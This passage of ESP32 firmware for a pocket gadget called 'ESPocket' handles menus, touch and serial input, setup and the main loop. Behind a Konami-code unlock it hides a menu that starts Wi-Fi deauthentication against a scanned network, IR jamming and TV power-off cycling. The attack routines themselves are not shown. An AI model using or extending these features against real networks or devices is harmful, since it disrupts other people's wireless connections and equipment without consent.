      else if(mainSel==4){ledMenuSel=0;goToScene(S_LED_MENU);}
      else if(mainSel==6){setSel=0;goToScene(S_SET);}
      break;
    case S_SONGS:goToScene(S_PLAYER);break;
    case S_BT_MENU:if(btMenuSel==0)goToScene(S_BT_SEARCH);break;
    case S_BT_DEV:connDevIdx=devSel;goToScene(S_BT_CONN);break;
    case S_GAMES:
      if(gamesSel==0){simonInit();goToScene(S_SIMON);}
      else if(gamesSel==1){lightsInit();goToScene(S_LIGHTS);}
      break;
    case S_HIDDEN:
      if(hiddenSel==0){wifiHSel=0;goToScene(S_WIFI_H);}
      else if(hiddenSel==1){btHSel=0;goToScene(S_BT_H);}
      else if(hiddenSel==2){irSel=0;goToScene(S_IR_H);}
      break;
    case S_WIFI_H:
      if(wifiHSel==0){netSel=0;wifiScanDone=false;wifiScanRunning=false;goToScene(S_WIFI_SCAN);}
      else{mockTitle="WIFI_OPS";mockSub=WIFI_H_M[wifiHSel];mockReturnScene=S_WIFI_H;goToScene(S_MOCK);}
      break;
    case S_BT_H:
      mockTitle="BT_OPS";mockSub=BT_H_M[btHSel];mockReturnScene=S_BT_H;goToScene(S_MOCK);
      break;
    case S_IR_H:
      if(irSel==0){irLearnSlot=0;irrecv.enableIRIn();irrecv.resume();goToScene(S_IR_LEARN);}
      else if(irSel==1){irListSel=0;goToScene(S_IR_LIST);}
      else if(irSel==2){irJamming=true;irJamStart=millis();irJamCount=0;irJamProtoIdx=0;irJamLastSend=0;goToScene(S_IR_JAM);}
      else if(irSel==3){irTvbgLast=0;irTvbgIdx=0;goToScene(S_IR_TVBG);}
      else if(irSel==4){irListSel=0;goToScene(S_IR_LIST);}
      break;
    case S_WIFI_SCAN:
      if(wifiScanDone && NET_COUNT > 0){
        targetNet=netSel;wifiActSel=0;goToScene(S_WIFI_TARGET);
      }
      break;
    case S_WIFI_TARGET:
      if (wifiActSel == 0) {
        deauthStart(targetNet);
        goToScene(S_DEAUTH);
      } else {
        mockTitle=WIFI_ACT_M[wifiActSel];
        mockSub=NETS[targetNet].ssid;
        mockReturnScene=S_WIFI_TARGET;
        goToScene(S_MOCK);
      }
      break;
    case S_IR_LIST:
      if(irSlots[irListSel].valid){irLastSlot=irListSel;irSendSlot(irListSel);goToScene(S_IR_TX);}
      break;
    case S_LED_MENU:
      if(ledMenuSel==0){fxSel=0;goToScene(S_LED_FX);}
      else if(ledMenuSel==1){lmSel=0;goToScene(S_LED_MUS);}
      else if(ledMenuSel==2)goToScene(S_LED_BR);
      else if(ledMenuSel==3)goToScene(S_LED_WIFI);
      break;
    case S_SET:if(setSel==4)goToScene(S_ABOUT);break;
  }
}
void handleBack(){
  switch(currentScene){
    case S_PLAYER:goToScene(S_SONGS);break;
    case S_SONGS:goToScene(S_MAIN);break;
    case S_BT_MENU:goToScene(S_MAIN);break;
    case S_BT_SEARCH:goToScene(S_BT_MENU);break;
    case S_BT_DEV:goToScene(S_BT_MENU);break;
    case S_BT_CONN:goToScene(S_BT_DEV);break;
    case S_LED_MENU:goToScene(S_MAIN);break;
    case S_LED_FX:goToScene(S_LED_MENU);break;
    case S_LED_MUS:goToScene(S_LED_MENU);break;
    case S_LED_BR:goToScene(S_LED_MENU);break;
    case S_LED_WIFI:goToScene(S_LED_MENU);break;
    case S_GAMES:goToScene(S_MAIN);break;
    case S_SIMON:goToScene(S_GAMES);break;
    case S_LIGHTS:goToScene(S_GAMES);break;
    case S_SET:goToScene(S_MAIN);break;
    case S_ABOUT:goToScene(S_SET);break;
    case S_HIDDEN:goToScene(S_MAIN);break;
    case S_WIFI_H:goToScene(S_HIDDEN);break;
    case S_BT_H:goToScene(S_HIDDEN);break;
    case S_IR_H:goToScene(S_HIDDEN);break;
    case S_WIFI_SCAN:
      WiFi.scanDelete();
      WiFi.mode(WIFI_OFF);
      WiFi.disconnect(true);
      wifiScanRunning = false;
      goToScene(S_WIFI_H);
      break;
    case S_WIFI_TARGET:goToScene(S_WIFI_SCAN);break;
    case S_MOCK:goToScene(mockReturnScene);break;
    case S_IR_LEARN:goToScene(S_IR_H);break;
    case S_IR_LIST:goToScene(S_IR_H);break;
    case S_IR_TX:goToScene(S_IR_H);break;
    case S_IR_JAM:irJamming=false;goToScene(S_IR_H);break;
    case S_IR_TVBG:goToScene(S_IR_H);break;
    case S_DEAUTH:
      deauthStop();
      goToScene(S_WIFI_TARGET);
      break;
  }
}

bool feedKonami(int code){
  if(currentScene!=S_MAIN)return false;
  unsigned long now=millis();
  if(now-konamiLastMs>3000)konamiProgress=0;
  if(code==KONAMI_CODE[konamiProgress]){
    konamiProgress++;konamiLastMs=now;
    if(konamiProgress>=KONAMI_LEN){
      konamiProgress=0;hiddenUnlocked=true;
      Serial.println("[HIDDEN] *** UNLOCKED ***");
      goToScene(S_HIDDEN);return true;
    }
  }else{konamiProgress=(code==KONAMI_CODE[0])?1:0;konamiLastMs=now;}
  return false;
}

void processInput(int code){
  unsigned long now=millis();
  if(now-lastInput<INPUT_DEBOUNCE)return;
  lastInput=now;
  if(feedKonami(code))return;
  if(code==0)handleUp();
  else if(code==1)handleDown();
  else if(code==2)handleSelect();
  else if(code==3)handleBack();
}

void checkHold(HoldState &h,bool isDown,int code){
  unsigned long now=millis();
  if(isDown&&!h.down){processInput(code);h.pressMs=now;h.lastRepeatMs=now;h.repeatActive=false;h.down=true;}
  else if(isDown&&h.down){if(!h.repeatActive&&(now-h.pressMs)>HOLD_DELAY){h.repeatActive=true;h.lastRepeatMs=now;}if(h.repeatActive&&(now-h.lastRepeatMs)>REPEAT_RATE){processInput(code);h.lastRepeatMs=now;}}
  else if(!isDown&&h.down){h.down=false;h.repeatActive=false;}
}

void scanTouch(){
  if(currentScene==S_OVERHEAT)return;
  if(currentScene==S_SIMON)return;
  if(currentScene==S_LIGHTS)return;
  checkHold(hUp,touched(TOUCH_UP,baseUp),0);
  checkHold(hDown,touched(TOUCH_DOWN,baseDown),1);
  checkHold(hSelect,touched(TOUCH_SELECT,baseSelect),2);
  checkHold(hBack,touched(TOUCH_BACK,baseBack),3);
}
void scanSerial(){
  if(currentScene==S_OVERHEAT)return;
  if(currentScene==S_SIMON)return;
  if(currentScene==S_LIGHTS)return;
  if(!Serial.available())return;
  char c=Serial.read();
  if(c=='u'||c=='U')processInput(0);
  else if(c=='d'||c=='D')processInput(1);
  else if(c=='s'||c=='S')processInput(2);
  else if(c=='b'||c=='B')processInput(3);
}
void checkOverheat(){
  if(overheatLatched)return;
  static unsigned long lastCheck=0;
  unsigned long now=millis();
  if(now-lastCheck<2000)return;
  lastCheck=now;
  lastTempC=readTempC();
  if(lastTempC>=TEMP_CRIT){overheatLatched=true;Serial.printf("[OVERHEAT] %.1f C\n",lastTempC);goToScene(S_OVERHEAT);}
}

// ============================================================
//  Setup + Loop
// ============================================================
void setup(){
  Serial.begin(115200);delay(300);
  Serial.println("\n[BOOT] ESPocket v8.2");

  Wire.begin(OLED_SDA,OLED_SCL);
  Wire.setClock(400000);
  if(!display.begin(SSD1306_SWITCHCAPVCC,OLED_ADDR)){Serial.println("[OLED] FAIL");while(1)delay(1000);}
  Serial.println("[OLED] OK");

  calibrateTouch();
  bootMs=millis();sceneStartMs=millis();

  delay(200);
  if(touched(TOUCH_BACK,baseBack)){hiddenUnlocked=true;Serial.println("[HIDDEN] boot-hold unlock");goToScene(S_HIDDEN);}

  WiFi.persistent(false);
  WiFi.mode(WIFI_OFF);

  prefs.begin("espocket",false);
  highScore=prefs.getInt("hi",0);
  Serial.printf("[PREFS] hi=%d\n",highScore);

  irsend.begin();
  irrecv.enableIRIn();
  irLoadAll();
  Serial.printf("[IR] %d slots valid\n",irCountValid());

  randomSeed(analogRead(0));
  lastTempC=readTempC();
  Serial.printf("[HEAP] %u B | Temp %.1f C\n",(unsigned)ESP.getFreeHeap(),lastTempC);
}

unsigned long lastDraw=0,lastFrame=0;
#define FRAME_MS 33

void loop(){
  unsigned long now=millis();
  if(now-lastFrame>=FRAME_MS){lastFrame=now;animFrame++;}
  scanSerial();
  scanTouch();
  checkOverheat();
  if(currentScene==S_BT_SEARCH&&(now-sceneStartMs)>3000){devSel=0;goToScene(S_BT_DEV);}
  if(now-lastDraw>=FRAME_MS){
    lastDraw=now;
    switch(currentScene){
      case S_MAIN:dMain();break;
      case S_SONGS:dSongs();break;
      case S_PLAYER:dPlayer();break;
      case S_BT_MENU:dBtMenu();break;
      case S_BT_SEARCH:dBtSearch();break;
      case S_BT_DEV:dBtDev();break;
      case S_BT_CONN:dBtConn();break;
      case S_LED_MENU:dLedMenu();break;
      case S_LED_FX:dLedFx();break;
      case S_LED_MUS:dLedMus();break;
      case S_LED_BR:dLedBright();break;
      case S_LED_WIFI:dLedWifi();break;
      case S_GAMES:dGames();break;
      case S_SIMON:dSimon();break;
      case S_LIGHTS:dLights();break;
      case S_HIDDEN:dHidden();break;
      case S_WIFI_H:dWifiH();break;
      case S_BT_H:dBtH();break;
      case S_IR_H:dIrH();break;
      case S_WIFI_SCAN:dWifiScan();break;
      case S_WIFI_TARGET:dWifiTarget();break;
      case S_MOCK:dMock();break;
      case S_IR_LEARN:dIrLearn();break;
      case S_IR_LIST:dIrList();break;
      case S_IR_TX:dIrTx();break;
      case S_IR_JAM:dIrJam();break;
      case S_IR_TVBG:dIrTvbg();break;
      case S_DEAUTH:dDeauth();break;
      case S_SET:dSet();break;
      case S_ABOUT:dAbout();break;
      case S_OVERHEAT:dOverheat();break;
    }
  }
}
